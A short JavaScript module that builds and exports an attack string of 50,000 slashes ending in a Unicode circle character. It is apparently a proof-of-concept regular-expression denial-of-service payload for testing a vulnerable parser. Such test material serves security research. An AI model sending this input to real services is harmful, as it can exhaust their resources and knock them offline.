function build_attack(n) {
  var ret = "";
  for (var i = 0; i < n; i++) {
    ret += "/";
  }
  return ret + "\u25CE";
}

function getPayload() {
    return build_attack(50000);
}

module.exports = { getPayload };